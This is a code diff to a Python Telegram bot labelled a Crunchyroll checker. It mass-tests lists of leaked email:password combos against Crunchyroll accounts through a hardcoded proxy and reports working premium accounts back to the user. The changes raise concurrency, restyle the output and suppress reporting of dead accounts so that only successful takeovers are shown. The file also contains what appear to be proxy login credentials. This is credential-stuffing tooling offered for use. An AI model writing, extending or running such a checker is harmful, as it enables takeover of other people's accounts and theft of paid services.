@@ -18,7 +18,7 @@ PROXY = "evo-pro.porterproxies.com:61236:PP_PGGKBC727X-country-US:atw43di2"
 ADMIN_ID = 6177293322
 ALLOWED_FILE = "allowed.json"
 STARTERS_FILE = "starters.json"
-CONCURRENT_CHECKS = 2
+CONCURRENT_CHECKS = 3
 MAX_RETRIES = 3
 
 logging.basicConfig(level=logging.INFO)
@@ -98,10 +98,10 @@ def progress_bar(current, total):
 
 START_MSG = (
     "<code>\n"
-    " • CRUNCHYROLL CHECKER •\n\n"
-    " /check - Check single account\n\n"
-    " /txt - Mass check via .txt\n"
-        "</code>"
+    " █ CRUNCHYROLL CHECKER █\n\n"
+    "[ Step 1 ] /check - Check single account\n"
+    "[ Step 2 ] /txt - Mass check via .txt\n</code>"
+
     "<a href=\"https://t.me/S4J4G\">‎ </a>"
 )
 
@@ -111,15 +111,15 @@ user_tasks = {}
 def format_hit(email, password, resp):
     return (
         "✅ <b>Premium</b>\n"
-        f"<code>Email: {email}\nPass: {password}</code>\n"
-        f"<b>Response:</b> {resp.get('message','')}"
+        f"<b>Email</b>: <code>{email}</code>\n<b>Pass</b>: <code>{password}</code>\n"
+        f"<b>Response:</b> <code> {resp.get('message','')}</code>"
     )
 
 def format_dead(email, password, resp):
     return (
         "❌ <b>Dead</b>\n"
-        f"<code>Email: {email}\nPass: {password}</code>\n"
-        f"<b>Response:</b> {resp.get('message','')}"
+        f"<b>Email</b>:<code> {email}\nPass: {password}</code>\n"
+        f"<b>Response:</b> <code> {resp.get('message','')}</code>"
     )
 
 # --- Handlers ---
@@ -195,13 +195,12 @@ async def txt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     total = len(combos)
     if not total:
         return await update.message.reply_text("No valid combos found in file.")
-    state = {"checked": 0, "hits": 0, "dead": 0, "stop": False}
+    state = {"checked": 0, "hits": 0, "stop": False}
     user_state[user_id] = state
 
     def get_markup():
         return InlineKeyboardMarkup([[
             InlineKeyboardButton(f"Hits ({state['hits']})", callback_data="show_hits"),
-            InlineKeyboardButton(f"Dead ({state['dead']})", callback_data="show_dead"),
             InlineKeyboardButton("Stop", callback_data="stop_check"),
         ]])
 
@@ -218,16 +217,15 @@ async def txt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=get_markup()
     )
 
-    async def send_result(is_hit, email, password, resp):
+    async def send_hit(email, password, resp):
         # Hits always to user DM if in group, else in same chat
-        if not is_private and is_hit:
+        if not is_private:
             await context.bot.send_message(
                 chat_id=user_id, text=format_hit(email, password, resp), parse_mode="HTML"
             )
         else:
-            message = format_hit(email, password, resp) if is_hit else format_dead(email, password, resp)
             await context.bot.send_message(
-                chat_id=chat_id, text=message, parse_mode="HTML"
+                chat_id=chat_id, text=format_hit(email, password, resp), parse_mode="HTML"
             )
 
     async def check_and_report(idx, email, password, sem):
@@ -240,15 +238,14 @@ async def txt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             state["checked"] += 1
             if is_hit:
                 state["hits"] += 1
-            else:
-                state["dead"] += 1
-            await send_result(is_hit, email, password, result)
+                await send_hit(email, password, result)
+            # No else: ignore dead/errors
             await msg.edit_text(
                 progress_note +
                 f"Crunchyroll Checking For {update.effective_user.username or update.effective_user.first_name}\n"
                 f"Progress: {progress_bar(state['checked'], total)}\n"
                 f"Total: {total} | Checked: {state['checked']}\n"
-                f"Hits: {state['hits']} | Dead: {state['dead']}",
+                f"Hits: {state['hits']}",
                 reply_markup=get_markup()
             )
 
@@ -263,13 +260,13 @@ async def txt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if state["stop"]:
             await msg.edit_text(
                 progress_note +
-                f"Stopped by user!\nChecked: {state['checked']} | Hits: {state['hits']} | Dead: {state['dead']}"
+                f"Stopped by user!\nChecked: {state['checked']} | Hits: {state['hits']}"
             )
         else:
             await msg.edit_text(
                 progress_note +
                 f"Done! Checked {state['checked']} accounts.\n"
-                f"Hits: {state['hits']} | Dead: {state['dead']}"
+                f"Hits: {state['hits']}"
             )
         user_state.pop(user_id, None)
         user_tasks.pop(user_id, None)
